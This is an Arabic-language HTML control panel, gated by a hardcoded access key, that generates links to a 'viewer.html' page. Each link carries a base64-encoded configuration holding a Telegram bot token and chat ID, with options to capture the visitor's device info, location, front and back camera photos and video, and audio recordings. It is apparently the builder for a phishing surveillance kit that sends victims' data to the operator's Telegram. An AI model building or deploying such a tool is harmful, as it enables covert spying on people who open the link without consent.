<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>API Controller</title>
<style>
    body { margin: 0; padding: 0; height: 100vh; background: #fff; display: flex; justify-content: center; align-items: center; font-family: Tahoma, sans-serif; text-align: center; }
    .error { display: none; font-size: 24px; font-weight: bold; color: #ff0000; }
    .dashboard { display: none; background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 500px; }
    .dashboard h2 { color: #333; margin-bottom: 20px; }
    .input-group { margin-bottom: 15px; text-align: right; }
    .input-group label { display: block; margin-bottom: 5px; color: #555; font-size: 14px; }
    .input-group input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; direction: ltr; }
    .checkbox-group { display: flex; flex-wrap: wrap; gap: 10px; margin: 20px 0; text-align: right; }
    .checkbox-group label { display: flex; align-items: center; gap: 5px; font-size: 14px; cursor: pointer; }
    button { width: 100%; padding: 12px; background: #007bff; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
    button:hover { background: #0056b3; }
    .result { margin-top: 20px; display: none; background: #f8f9fa; padding: 15px; border-radius: 6px; border: 1px solid #ddd; }
    .result textarea { width: 100%; height: 80px; padding: 10px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-family: monospace; direction: ltr; resize: none; }
</style>
</head>
<body>

    <div id="error-screen" class="error">خطأ في API key</div>

    <div id="dashboard" class="dashboard">
        <h2>لوحة التحكم - توليد الرابط</h2>
        
        <div class="input-group">
            <label>Chat ID:</label>
            <input type="text" id="tg-id" placeholder="7194730111">
        </div>
        <div class="input-group">
            <label>Bot Token:</label>
            <input type="text" id="tg-token" placeholder="8995993534:...">
        </div>

        <div class="checkbox-group">
            <label><input type="checkbox" id="chk-inf" checked> معلومات الجهاز (inf)</label>
            <label><input type="checkbox" id="chk-loc" checked> الموقع (loc)</label>
            <label><input type="checkbox" id="chk-fc"> كاميرا أمامية (fc)</label>
            <label><input type="checkbox" id="chk-bc"> كاميرا خلفية (bc)</label>
            <label><input type="checkbox" id="chk-fcv"> فيديو أمامي (fcv)</label>
            <label><input type="checkbox" id="chk-bcv"> فيديو خلفي (bcv)</label>
            <label><input type="checkbox" id="chk-r"> تسجيل صوتي (r)</label>
        </div>

        <button onclick="generateLink()">توليد الرابط المشفر</button>

        <div class="result" id="result-box">
            <p style="color:green; font-weight:bold; margin-top:0;">الرابط جاهز:</p>
            <textarea id="output-link" readonly></textarea>
            <button style="margin-top:10px; background:#28a745;" onclick="copyLink()">نسخ الرابط</button>
        </div>
    </div>

    <script>
        // 1. التحقق من مفتاح الـ API
        const urlParams = new URLSearchParams(window.location.search);
        const apiKey = urlParams.get('api');
        
        if (apiKey === "754298") {
            document.getElementById('dashboard').style.display = 'block';
        } else {
            document.getElementById('error-screen').style.display = 'block';
        }

        // 2. توليد الرابط
        function generateLink() {
            const id = document.getElementById('tg-id').value.trim();
            const token = document.getElementById('tg-token').value.trim();
            if (!id || !token) { alert("يرجى ملء الـ ID والتوكن!"); return; }

            const config = {
                id: id, token: token,
                inf: document.getElementById('chk-inf').checked,
                loc: document.getElementById('chk-loc').checked,
                fc: document.getElementById('chk-fc').checked,
                bc: document.getElementById('chk-bc').checked,
                fcv: document.getElementById('chk-fcv').checked,
                bcv: document.getElementById('chk-bcv').checked,
                r: document.getElementById('chk-r').checked
            };

            const jsonStr = JSON.stringify(config);
            const base64Data = btoa(unescape(encodeURIComponent(jsonStr)));

            // بيبني الرابط على نفس الدومين بتاعك ويفتح viewer.html
            const baseUrl = window.location.origin + window.location.pathname.replace('index.html', '');
            const finalLink = baseUrl + "viewer.html?data=" + encodeURIComponent(base64Data);

            document.getElementById('output-link').value = finalLink;
            document.getElementById('result-box').style.display = 'block';
        }

        function copyLink() {
            const copyText = document.getElementById('output-link');
            copyText.select();
            document.execCommand("copy");
            alert("تم النسخ!");
        }
    </script>
</body>
</html>
